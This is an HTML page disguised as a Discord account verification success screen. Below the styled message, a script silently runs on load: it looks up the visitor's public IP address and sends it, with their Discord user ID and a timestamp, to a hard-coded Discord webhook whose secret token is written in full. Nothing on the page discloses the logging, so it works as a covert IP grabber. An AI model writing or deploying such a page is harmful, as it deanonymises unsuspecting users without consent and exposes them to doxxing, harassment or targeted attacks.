<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification Complete</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: linear-gradient(135deg, #0a0a0a, #1a0033);
      color: #ffffff;
      font-family: 'Inter', Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
    }

    /* Background glow orbs */
    body::before,
    body::after {
      content: '';
      position: absolute;
      border-radius: 50%;
      filter: blur(120px);
      opacity: 0.15;
      z-index: -1;
    }

    body::before {
      background: #00ff88;
      width: 600px;
      height: 600px;
      top: -200px;
      left: -200px;
    }

    body::after {
      background: #7b00ff;
      width: 700px;
      height: 700px;
      bottom: -300px;
      right: -200px;
    }

    .container {
      background: rgba(255, 255, 255, 0.08);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border: 1px solid rgba(255, 255, 255, 0.15);
      border-radius: 24px;
      padding: 60px 50px;
      width: 100%;
      max-width: 460px;
      text-align: center;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
      animation: fadeInScale 0.8s cubic-bezier(0.23, 1, 0.32, 1) forwards;
    }

    @keyframes fadeInScale {
      from {
        opacity: 0;
        transform: scale(0.85) translateY(30px);
      }
      to {
        opacity: 1;
        transform: scale(1) translateY(0);
      }
    }

    .icon {
      width: 90px;
      height: 90px;
      background: rgba(0, 255, 136, 0.15);
      border: 2px solid #00ff88;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 30px;
      animation: popIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
      box-shadow: 0 0 40px rgba(0, 255, 136, 0.4);
    }

    @keyframes popIn {
      0% { transform: scale(0.3); }
      60% { transform: scale(1.15); }
      100% { transform: scale(1); }
    }

    h1 {
      font-size: 42px;
      font-weight: 600;
      margin-bottom: 16px;
      background: linear-gradient(90deg, #00ff88, #7bffcc);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    p {
      font-size: 18px;
      line-height: 1.6;
      opacity: 0.85;
      margin-bottom: 12px;
    }

    .return-text {
      margin-top: 40px;
      font-size: 15px;
      opacity: 0.7;
    }

    /* Subtle pulse animation on icon */
    .icon::after {
      content: '';
      position: absolute;
      width: 110px;
      height: 110px;
      border: 2px solid rgba(0, 255, 136, 0.3);
      border-radius: 50%;
      animation: pulse 2s infinite ease-out;
    }

    @keyframes pulse {
      0% { transform: scale(0.8); opacity: 0.6; }
      100% { transform: scale(1.6); opacity: 0; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="icon">
      <span style="font-size: 48px;">✅</span>
    </div>
    <h1>Verification Complete</h1>
    <p>You have successfully verified your account.</p>
    <p>You can now return to the Discord server.</p>
    
    <div class="return-text">
      Redirecting you shortly...
    </div>
  </div>

  <!-- Original IP + User ID Logging (unchanged) -->
  <script>
    const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1521304967267352748/98SDkrBuIZ-vadcFIYGt5-igYech7LvaLnbGL1xnU1vJbprTRNyN_SWOLfH297O3KVwe";
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('user_id') || 'unknown';

    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: "🔍 Verification Log",
              color: 0x00FF88,
              fields: [
                { name: "Discord User ID", value: userId, inline: true },
                { name: "IP Address", value: ip, inline: true },
                { name: "Time", value: new Date().toLocaleString(), inline: true }
              ]
            }]
          })
        });
      })
      .catch(() => {});
  </script>
</body>
</html>
